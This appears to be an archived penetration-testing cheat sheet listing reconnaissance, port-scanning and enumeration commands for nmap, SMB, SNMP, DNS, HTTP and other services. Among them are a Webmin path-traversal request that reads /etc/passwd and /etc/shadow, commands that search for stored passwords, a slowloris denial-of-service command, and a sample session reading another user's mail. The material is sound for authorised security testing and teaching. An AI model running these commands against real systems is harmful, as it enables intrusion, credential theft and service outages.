# [](#information-gathering--vulnerability-scanning)Information Gathering & Vulnerability Scanning

*   ## [](#passive-information-gathering)Passive Information Gathering

*   Google Hacking

    *   Google search to find website sub domains  
        `site:microsoft.com`

    *   Google filetype, and intitle  
        `intitle:"netbotz appliance" "OK" -filetype:pdf`

    *   Google inurl  
        `inurl:"level/15/sexec/-/show"`

    *   Google Hacking Database:  
        [https://www.exploit-db.com/google-hacking-database/](http://web.archive.org/web/20171113221652/https://www.exploit-db.com/google-hacking-database/)

*   SSL Certificate Testing  
    [https://www.ssllabs.com/ssltest/analyze.html](http://web.archive.org/web/20171113221652/https://www.ssllabs.com/ssltest/analyze.html)

*   Email Harvesting

    *   Simply Email  
        `git clone https://github.com/killswitch-GUI/SimplyEmail.git`

        `./SimplyEmail.py -all -e TARGET-DOMAIN`

*   LDAP
  
    *   LDAP null bind  
        `ldapsearch -x -b "ou=anonymous,dc=challenge01,dc=root-me,dc=org" -H "ldap://challenge01.root-me.org:54013"`

*   Netcraft

    *   Determine the operating system and tools used to build a site  
        [https://searchdns.netcraft.com/](http://web.archive.org/web/20171113221652/https://searchdns.netcraft.com/)
*   Whois Enumeration  
    `whois domain-name-here.com`

    `whois $ip`

*   Banner Grabbing

    *   `nc -v $ip 25`

    *   `telnet $ip 25`

    *   `nc TARGET-IP 80`

*   Recon-ng - full-featured web reconnaissance framework written in Python

    *   `cd /opt; git clone https://LaNMaSteR53@bitbucket.org/LaNMaSteR53/recon-ng.git`

        `cd /opt/recon-ng`

        `./recon-ng`

        `show modules`

        `help`

*   ## [](#active-information-gathering)Active Information Gathering

*   ## [](#port-scanning)Port Scanning

_Subnet Reference Table_

<table>

<thead>

<tr>

<th>/</th>

<th>Addresses</th>

<th>Hosts</th>

<th>Netmask</th>

<th>Amount of a Class C</th>

</tr>

</thead>

<tbody>

<tr>

<td>/30</td>

<td>4</td>

<td>2</td>

<td>255.255.255.252</td>

<td>1/64</td>

</tr>

<tr>

<td>/29</td>

<td>8</td>

<td>6</td>

<td>255.255.255.248</td>

<td>1/32</td>

</tr>

<tr>

<td>/28</td>

<td>16</td>

<td>14</td>

<td>255.255.255.240</td>

<td>1/16</td>

</tr>

<tr>

<td>/27</td>

<td>32</td>

<td>30</td>

<td>255.255.255.224</td>

<td>1/8</td>

</tr>

<tr>

<td>/26</td>

<td>64</td>

<td>62</td>

<td>255.255.255.192</td>

<td>1/4</td>

</tr>

<tr>

<td>/25</td>

<td>128</td>

<td>126</td>

<td>255.255.255.128</td>

<td>1/2</td>

</tr>

<tr>

<td>/24</td>

<td>256</td>

<td>254</td>

<td>255.255.255.0</td>

<td>1</td>

</tr>

<tr>

<td>/23</td>

<td>512</td>

<td>510</td>

<td>255.255.254.0</td>

<td>2</td>

</tr>

<tr>

<td>/22</td>

<td>1024</td>

<td>1022</td>

<td>255.255.252.0</td>

<td>4</td>

</tr>

<tr>

<td>/21</td>

<td>2048</td>

<td>2046</td>

<td>255.255.248.0</td>

<td>8</td>

</tr>

<tr>

<td>/20</td>

<td>4096</td>

<td>4094</td>

<td>255.255.240.0</td>

<td>16</td>

</tr>

<tr>

<td>/19</td>

<td>8192</td>

<td>8190</td>

<td>255.255.224.0</td>

<td>32</td>

</tr>

<tr>

<td>/18</td>

<td>16384</td>

<td>16382</td>

<td>255.255.192.0</td>

<td>64</td>

</tr>

<tr>

<td>/17</td>

<td>32768</td>

<td>32766</td>

<td>255.255.128.0</td>

<td>128</td>

</tr>

<tr>

<td>/16</td>

<td>65536</td>

<td>65534</td>

<td>255.255.0.0</td>

<td>256</td>

</tr>

</tbody>

</table>

*   Set the ip address as a variable  
    `export ip=192.168.1.100` `nmap -A -T4 -p- $ip`

*   Netcat port Scanning  
    `nc -nvv -w 1 -z $ip 3388-3390`

*   Discover active IPs usign ARP on the network: `arp-scan $ip/24`

*   Discover who else is on the network  
    `netdiscover`

*   Discover IP Mac and Mac vendors from ARP  
    `netdiscover -r $ip/24`

*   Nmap stealth scan using SYN  
    `nmap -sS $ip`

*   Nmap stealth scan using FIN  
    `nmap -sF $ip`

*   Nmap Banner Grabbing  
    `nmap -sV -sT $ip`

*   Nmap OS Fingerprinting  
    `nmap -O $ip`

*   Nmap Regular Scan:  
    `nmap $ip/24`

*   Enumeration Scan  
    `nmap -p 1-65535 -sV -sS -A -T4 $ip/24 -oN nmap.txt`

*   Enumeration Scan All Ports TCP / UDP and output to a txt file  
    `nmap -oN nmap2.txt -v -sU -sS -p- -A -T4 $ip`

*   Nmap output to a file:  
    `nmap -oN nmap.txt -p 1-65535 -sV -sS -A -T4 $ip/24`

*   Quick Scan:  
    `nmap -T4 -F $ip/24`

*   Quick Scan Plus:  
    `nmap -sV -T4 -O -F --version-light $ip/24`

*   Quick traceroute  
    `nmap -sn --traceroute $ip`

*   All TCP and UDP Ports  
    `nmap -v -sU -sS -p- -A -T4 $ip`

*   Intense Scan:  
    `nmap -T4 -A -v $ip`

*   Intense Scan Plus UDP  
    `nmap -sS -sU -T4 -A -v $ip/24`

*   Intense Scan ALL TCP Ports  
    `nmap -p 1-65535 -T4 -A -v $ip/24`

*   Intense Scan - No Ping  
    `nmap -T4 -A -v -Pn $ip/24`

*   Ping scan  
    `nmap -sn $ip/24`

*   Slow Comprehensive Scan  
    `nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" $ip/24`

*   Scan with Active connect in order to weed out any spoofed ports designed to troll you  
    `nmap -p1-65535 -A -T5 -sT $ip`
   
*   Scan for vulnerabilities (good for end of life machines)  
    `nmap --script vuln $ip`

*   ## [](#enumeration)Enumeration

*   DNS Enumeration

    *   NMAP DNS Hostnames Lookup `nmap -F --dns-server <dns server ip> <target ip range>`

    *   Host Lookup  
        `host -t ns megacorpone.com`

    *   Reverse Lookup Brute Force - find domains in the same range  
        `for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"`

    *   Perform DNS IP Lookup  
        `dig a domain-name-here.com @nameserver`

    *   Perform MX Record Lookup  
        `dig mx domain-name-here.com @nameserver`

    *   Perform Zone Transfer with DIG  
        `dig axfr domain-name-here.com @nameserver`

    *   DNS Zone Transfers  
        Windows DNS zone transfer

        `nslookup -> set type=any -> ls -d blah.com`

        Linux DNS zone transfer

        `dig axfr blah.com @ns1.blah.com`

    *   Dnsrecon DNS Brute Force  
        `dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml`

    *   Dnsrecon DNS List of megacorp  
        `dnsrecon -d megacorpone.com -t axfr`

    *   DNSEnum  
        `dnsenum zonetransfer.me`

*   NMap Enumeration Script List:

    *   NMap Discovery  
        [_https://nmap.org/nsedoc/categories/discovery.html_](http://web.archive.org/web/20171113221652/https://nmap.org/nsedoc/categories/discovery.html)

    *   Nmap port version detection MAXIMUM power  
        `nmap -vvv -A --reason --script="+(safe or default) and not broadcast" -p <port> <host>`

*   NFS (Network File System) Enumeration

    *   Show Mountable NFS Shares `nmap -sV --script=nfs-showmount $ip`
*   RPC (Remote Procedure Call) Enumeration

    *   Connect to an RPC share without a username and password and enumerate privledges `rpcclient --user="" --command=enumprivs -N $ip`

    *   Connect to an RPC share with a username and enumerate privledges `rpcclient --user="<Username>" --command=enumprivs $ip`

*   SMB Enumeration

    *   SMB OS Discovery  
        `nmap $ip --script smb-os-discovery.nse`

    *   Nmap port scan  
        `nmap -v -p 139,445 -oG smb.txt $ip-254`

    *   Netbios Information Scanning  
        `nbtscan -r $ip/24`

    *   Nmap find exposed Netbios servers  
        `nmap -sU --script nbstat.nse -p 137 $ip`

    *   Nmap all SMB scripts scan

        `nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip`

    *   Nmap all SMB scripts authenticated scan

        `nmap -sV -Pn -vv -p 445 --script-args smbuser=<username>,smbpass=<password> --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip`

    *   SMB Enumeration Tools  
        `nmblookup -A $ip`

        `smbclient //MOUNT/share -I $ip -N`

        `rpcclient -U "" $ip`

        `enum4linux $ip`

        `enum4linux -a $ip`

    *   SMB Finger Printing  
        `smbclient -L //$ip`

    *   Nmap Scan for Open SMB Shares  
        `nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24`

    *   Nmap scans for vulnerable SMB Servers  
        `nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip`

    *   Nmap List all SMB scripts installed  
        `ls -l /usr/share/nmap/scripts/smb*`

    *   Enumerate SMB Users

        `nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $ip-14`

        OR

        `python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip`

    *   RID Cycling - Null Sessions  
        `ridenum.py $ip 500 50000 dict.txt`

    *   Manual Null Session Testing

        Windows: `net use \\$ip\IPC$ "" /u:""`

        Linux: `smbclient -L //$ip`

*   SMTP Enumeration - Mail Severs

    *   Verify SMTP port using Netcat  
        `nc -nv $ip 25`
*   POP3 Enumeration - Reading other peoples mail - You may find usernames and passwords for email accounts, so here is how to check the mail using Telnet

         root@kali:~# telnet $ip 110
         +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
         USER billydean    
         +OK
         PASS password
         +OK Welcome billydean

         list

         +OK 2 1807
         1 786
         2 1021

         retr 1

         +OK Message follows
         From: jamesbrown@motown.com
         Dear Billy Dean,

         Here is your login for remote desktop ... try not to forget it this time!
         username: billydean
         password: PA$$W0RD!Z

*   SNMP Enumeration -Simple Network Management Protocol

    *   Fix SNMP output values so they are human readable  
        `apt-get install snmp-mibs-downloader download-mibs` `echo "" > /etc/snmp/snmp.conf`

    *   SNMP Enumeration Commands

        *   `snmpcheck -t $ip -c public`

        *   `snmpwalk -c public -v1 $ip 1|`

        *   `grep hrSWRunName|cut -d\* \* -f`

        *   `snmpenum -t $ip`

        *   `onesixtyone -c names -i hosts`

    *   SNMPv3 Enumeration  
        `nmap -sV -p 161 --script=snmp-info $ip/24`

    *   Automate the username enumeration process for SNMPv3:  
        `apt-get install snmp snmp-mibs-downloader` `wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb`

    *   SNMP Default Credentials  
        /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt

*   MS SQL Server Enumeration

    *   Nmap Information Gathering

        `nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip`

*   Webmin and miniserv/0.01 Enumeration - Port 10000

    Test for LFI & file disclosure vulnerability by grabbing /etc/passwd

        `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd`

    Test to see if webmin is running as root by grabbing /etc/shadow

        `curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow`

*   Linux OS Enumeration

    *   List all SUID files  
        `find / -perm -4000 2>/dev/null`

    *   Determine the current version of Linux  
        `cat /etc/issue`

    *   Determine more information about the environment  
        `uname -a`

    *   List processes running  
        `ps -xaf`

    *   List the allowed (and forbidden) commands for the invoking use  
        `sudo -l`

    *   List iptables rules  
        `iptables --table nat --list iptables -vL -t filter iptables -vL -t nat iptables -vL -t mangle iptables -vL -t raw iptables -vL -t security`

*   Windows OS Enumeration

    *   net config Workstation

    *   systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

    *   hostname

    *   net users

    *   ipconfig /all

    *   route print

    *   arp -A

    *   netstat -ano

    *   netsh firewall show state

    *   netsh firewall show config

    *   schtasks /query /fo LIST /v

    *   tasklist /SVC

    *   net start

    *   DRIVERQUERY

    *   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

    *   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

    *   dir /s _pass_ == _cred_ == _vnc_ == _.config_

    *   findstr /si password *.xml *.ini *.txt

    *   reg query HKLM /f password /t REG_SZ /s

    *   reg query HKCU /f password /t REG_SZ /s

*   Vulnerability Scanning with Nmap

*   Nmap Exploit Scripts  
    [_https://nmap.org/nsedoc/categories/exploit.html_](http://web.archive.org/web/20171113221652/https://nmap.org/nsedoc/categories/exploit.html)

*   Nmap search through vulnerability scripts  
    `cd /usr/share/nmap/scripts/ ls -l \*vuln\*`

*   Nmap search through Nmap Scripts for a specific keyword  
    `ls /usr/share/nmap/scripts/\* | grep ftp`

*   Scan for vulnerable exploits with nmap  
    `nmap --script exploit -Pn $ip`

*   NMap Auth Scripts  
    [_https://nmap.org/nsedoc/categories/auth.html_](http://web.archive.org/web/20171113221652/https://nmap.org/nsedoc/categories/auth.html)

*   Nmap Vuln Scanning  
    [_https://nmap.org/nsedoc/categories/vuln.html_](http://web.archive.org/web/20171113221652/https://nmap.org/nsedoc/categories/vuln.html)

*   NMap DOS Scanning  
    `nmap --script dos -Pn $ip NMap Execute DOS Attack nmap --max-parallelism 750 -Pn --script http-slowloris --script-args http-slowloris.runforever=true`

*   Scan for coldfusion web vulnerabilities  
    `nmap -v -p 80 --script=http-vuln-cve2010-2861 $ip`

*   Anonymous FTP dump with Nmap  
    `nmap -v -p 21 --script=ftp-anon.nse $ip-254`

*   SMB Security mode scan with Nmap  
    `nmap -v -p 21 --script=ftp-anon.nse $ip-254`

*   File Enumeration

    *   Find UID 0 files root execution

    *   `/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2>/dev/null`

    *   Get handy linux file system enumeration script (/var/tmp)  
        `wget https://highon.coffee/downloads/linux-local-enum.sh` `chmod +x ./linux-local-enum.sh` `./linux-local-enum.sh`

    *   Find executable files updated in August  
        `find / -executable -type f 2> /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Aug`

    *   Find a specific file on linux  
        `find /. -name suid\*`

    *   Find all the strings in a file  
        `strings <filename>`

    *   Determine the type of a file  
        `file <filename>`

*   ## [](#http-enumeration)HTTP Enumeration

    *   Search for folders with gobuster:  
        `gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip`

    *   OWasp DirBuster - Http folder enumeration - can take a dictionary file

    *   Dirb - Directory brute force finding using a dictionary file  
        `dirb http://$ip/ wordlist.dict` `dirb <http://vm/>`

        Dirb against a proxy

    *   `dirb [http://$ip/](http://172.16.0.19/) -p $ip:3129`

    *   Nikto  
        `nikto -h $ip`

    *   HTTP Enumeration with NMAP  
        `nmap --script=http-enum -p80 -n $ip/24`

    *   Nmap Check the server methods  
        `nmap --script http-methods --script-args http-methods.url-path='/test' $ip`

    *   Get Options available from web server `curl -vX OPTIONS vm/test`

    *   Uniscan directory finder:  
        `uniscan -qweds -u <http://vm/>`

    *   Wfuzz - The web brute forcer

        `wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test`

        `wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ`

        `wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"`

        `wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ`

        Recurse level 3

        `wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ`

*   Open a service using a port knock (Secured with Knockd)  
    for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x server_ip_address; done

*   WordPress Scan - Wordpress security scanner

    *   wpscan --url $ip/blog --proxy $ip:3129
*   RSH Enumeration - Unencrypted file transfer system

    *   auxiliary/scanner/rservices/rsh_login
*   Finger Enumeration

    *   finger @$ip

    *   finger batman@$ip

*   TLS & SSL Testing

    *   ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha > OUTPUT-FILE.html
*   Proxy Enumeration (useful for open proxies)

    *   nikto -useproxy http://$ip:3128 -h $ip
*   Steganography

> apt-get install steghide
> 
> steghide extract -sf picture.jpg
> 
> steghide info picture.jpg
> 
> apt-get install stegosuite

*   The OpenVAS Vulnerability Scanner

    *   apt-get update  
        apt-get install openvas  
        openvas-setup

    *   netstat -tulpn

    *   Login at:  
        https://$ip:9392
